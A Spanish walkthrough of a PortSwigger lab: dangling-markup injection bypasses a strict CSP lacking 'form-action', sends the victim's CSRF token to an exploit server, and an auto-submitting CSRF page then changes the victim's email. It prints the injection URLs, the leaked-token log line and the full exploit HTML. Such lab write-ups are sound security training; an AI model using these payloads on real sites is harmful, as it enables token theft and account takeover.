
---

# XSS con CSP estricta y ataque de marcado colgante

## Introducción

Este laboratorio parte de una situación donde existe un XSS reflejado, pero **la ejecución de JavaScript está completamente bloqueada por una Content Security Policy muy restrictiva**.  

Aun así, la página contiene un formulario con un campo oculto `csrf` que puede verse afectado si conseguimos **romper la estructura HTML** mediante la técnica conocida como **ataque de marcado colgante** (_dangling markup_).

El objetivo final consiste en:

1. Manipular la estructura del formulario.
    
2. Introducir un nuevo formulario controlado por nosotros.
    
3. Reutilizar el `csrf` legítimo de la víctima.
    
4. Exfiltrarlo hacia nuestro exploit server.
    
5. Finalmente, usar ese token real para enviar un **POST legítimo** que cambie el correo electrónico de la cuenta de la víctima.
    

Este laboratorio demuestra que **romper el HTML**, incluso sin ejecutar JS, puede ser suficiente para subvertir la lógica de un formulario cuando la CSP no controla la directiva `form-action`.

[Ver laboratorio Portswigger](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

---

# Análisis del entorno

El formulario original es:

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="UPbvZMII3iEdZ6xxMv3YQ5uYQuubyKWp">
    <button class="button" type="submit"> Update email </button>
</form>
```

Características relevantes:

- El parámetro `email` se refleja en el campo `value=`.
    
- Existe un campo oculto `csrf`.
    
- La CSP incluye:
    
    ```
    default-src 'self';
    object-src 'none';
    style-src 'self';
    script-src 'self';
    img-src 'self';
    base-uri 'none';
    ```
    
    Lo que bloquea totalmente scripts inline o externos.
    
- **No existe directiva `form-action`**, por lo que podemos enviar formularios a dominios externos.
    

---

# Secuencia de explotación

## 1. Observación del reflejo del parámetro `email`

Probamos:

```
https://LAB-ID/web-security-academy.net/my-account?email=prueba
```

El valor se refleja correctamente:

```html
<input required="" type="email" name="email" value="prueba">
```

---

## 2. Intento de cerrar el atributo

Probamos:

```
?email=prueba">
```

En el código fuente se muestra escapado:

```html
<input ... value="prueba">"&gt;
```

Esto confirma una sanitización parcial, pero **no impide completamente el marcado colgante**, ya que más adelante podremos inyectar estructuras completas de HTML.

---

## 3. Intento fallido de XSS mediante `<script>`

Probamos:

```
?email=prueba"><script>alert(0)</script>
```

El navegador bloquea la ejecución:

```
Content-Security-Policy: ... script-src 'self'
```

Esto descarta por completo la ejecución directa de JavaScript y nos confirma que debemos explotar **inyección estructural**, no ejecución de scripts.

---

## 4. Inyección de un formulario controlado — marcado colgante

El objetivo es:

1. Cerrar el formulario original.
    
2. Abrir un nuevo formulario que **tenga dentro el mismo `csrf` del formulario real**.
    
3. Redirigirlo hacia el exploit server.
    

Probamos:

```
?email=prueba"></form><form class="login_form" name="myform" action="https://EXPLOIT/exploit" method="GET">
```

En el código fuente observamos:

**Formulario original cerrado:**

```html
<input ... value="prueba"></form>
```

**Nuevo formulario que contiene el token legítimo:**

```html
<form class="login_form" name="myform" action="https://EXPLOIT/exploit" method="GET">"&gt;
    <input type="hidden" name="csrf" value="UPbvZMII3iEdZ6xxMv3YQ5uYQuubyKWp">
    <button class="button" type="submit"> Update email </button>
</form>
```

El campo `csrf` pasa automáticamente a nuestro formulario.

---

## 5. Añadimos un botón “Click me” para exfiltrar el token

Construimos la siguiente URL:

```
?email=prueba"></form><form class="login_form" name="myform" action="https://EXPLOIT/exploit" method="GET"><button class="button" type="submit">Click me</button
```

Al pulsar el botón, la víctima realiza:

```
GET /exploit?csrf=uirjbHPBBQWLgO1afLbNG8V3frYxLLmI...
```

Y lo vemos en los logs del exploit server:

```
GET /exploit?csrf=uirjbHPBBQWLgO1afLbNG8V3frYxLLmI HTTP/1.1
```

Objetivo cumplido: **exfiltración del token sin JS**.

---

## 6. No podemos reutilizar el token manualmente

Aunque podemos ver el token, intentar usarlo directamente con Burp falla:

- No tenemos la sesión de la víctima.
    
- El backend valida token + sesión → si no coinciden, rechaza la petición.
    

Necesitamos que **la víctima misma** envíe el POST válido.

---

## 7. Fase final: exploit que automatiza el cambio de email

Creamos una página en el exploit server que:

1. Cuando la víctima haga clic en nuestro "Click me", nos envía el `csrf`.
    
2. Guardamos ese token.
    
3. Le entregamos una página que envía un POST automático a `/my-account/change-email` con el token correcto.
    

Ejemplo usado:

```html
<html>
    <body>
        <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="hacker@evil-user.net" />
            <input type="hidden" name="csrf" value="TOKENGENERADO_PARA_LA_VICTIMA" />
            <input type="submit" value="Submit request" />
        </form>
        <script>
            history.pushState('', '', '/');
            document.forms[0].submit();
        </script>
    </body>
</html>
```

Al almacenarlo como **Stored** y enviarlo a la víctima:

- El navegador de la víctima ejecuta el formulario legítimo.
    
- Usa su propio token `csrf`.
    
- Cambia su email a `hacker@evil-user.net`.
    

Laboratorio completado.

---

# Conclusión

Este ejercicio demuestra varios aprendizajes clave:

- La ejecución de scripts puede estar prohibida, pero **romper el HTML** ya permite vulnerar la aplicación.
    
- `form-action` es esencial: si no está en la CSP, los formularios pueden enviarse a cualquier dominio.
    
- La exfiltración de datos mediante GET/POST sigue siendo viable incluso sin JavaScript.
    
- Aprovechar un XSS estructural y un marcado colgante puede conducir a una toma de control total de la cuenta.
    

Cuando la aplicación mezcla sanitización incompleta, falta de `form-action`, y reflejo directo de parámetros, el atacante puede reconstruir completamente el flujo del formulario y robar tokens CSRF sin necesidad de ejecutar código.

---
